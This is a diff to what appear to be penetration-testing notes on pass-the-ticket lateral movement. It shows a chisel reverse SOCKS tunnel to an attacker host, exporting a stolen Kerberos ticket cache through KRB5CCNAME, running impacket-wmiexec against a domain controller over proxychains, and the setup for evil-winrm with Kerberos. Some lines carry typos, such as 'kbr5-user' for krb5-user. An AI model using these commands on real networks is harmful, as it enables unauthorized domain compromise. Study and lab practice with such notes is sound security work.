@@ -81,3 +81,19 @@ sudo ./chisel server --reverse
 chisel.exe client atcckerip::8080 R:socks
 ```
 
+now we have to transfer valid cacche file to our attacker and export it as a variable 
+```bash 
+export KRB5CCNAME=/path/to/ticket
+```
+
+To use the kerberos ticket we have to specify the target machine, not the ip address 
+```bash 
+proxychains impacket-wmiexec dc01 -k --no-pass
+```
+- `-k` for kerberos auth 
+> **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
+
+
+To use evil-winrm with kerberos, we need to install the kerberos package for network authentication, `kbr5-user`, with domain as the kerberos realm , server can be empty or the target machine name
+
+
